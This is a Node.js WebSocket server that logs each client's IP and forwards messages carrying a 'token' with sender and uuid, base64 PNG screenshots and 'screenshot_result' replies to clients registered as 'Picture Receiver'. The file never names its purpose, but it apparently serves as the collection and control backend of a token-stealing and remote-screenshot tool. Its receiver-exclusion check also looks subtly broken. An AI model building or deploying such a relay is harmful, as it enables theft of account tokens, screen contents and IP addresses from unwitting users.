import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';

const app = express();
app.use(express.static("public"));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId = null;

wss.on("connection", (ws, request) => {
    const userID = crypto.randomUUID();
    const ip = request.headers['x-forwarded-for']?.split(',')[0].trim() || request.socket.remoteAddress;
    
    console.log(`New connection from IP: ${ip} with userID: ${userID}`);
    
    ws.on("message", (data) => {
        handleMessage(ws, data, userID, ip);
    });

    ws.on("close", () => {
        console.log(`Connection closed for IP: ${ip} with userID: ${userID}`);
        handleDisconnect(userID);
        ws.removeAllListeners();
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

const handleMessage = (ws, data, userID, ip) => {
    try {
        const messageData = JSON.parse(data.toString());
        console.log(`Received message from IP: ${ip}, UserID: ${userID}, Type: ${messageData.type || 'Unknown'}`);

        if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
            console.log(`Registered Picture Receiver: IP: ${ip}, UserID: ${userID}`);
        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid) {
            // Include IP in the token information
            messageData.ip = ip;
            broadcastToPictureReceivers(messageData);
            console.log(`Broadcasting token info: Sender: ${messageData.sender}, IP: ${ip}`);
        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data,
                ip: ip // Include IP in screenshot data
            });
            console.log(`Broadcasting screenshot: Action: ${messageData.action}, IP: ${ip}`);
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data,
                ip: ip // Include IP in screenshot result
            });
            console.log(`Broadcasting screenshot result: Screen: ${messageData.screen}, IP: ${ip}`);
        } else {
            // For other message types, include IP in the broadcast
            messageData.ip = ip;
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
            console.log(`Broadcasting general message: Type: ${messageData.type || 'Unknown'}, IP: ${ip}`);
        }
    } catch (e) {
        console.error(`Error processing message from IP: ${ip}, UserID: ${userID}:`, e);
        console.error('Raw message data:', data);
    }
};

const broadcastToPictureReceivers = (message) => {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error(`Error sending message to receiver UserID: ${userId}:`, error);
            });
        }
    });
};

const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID) => {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
};
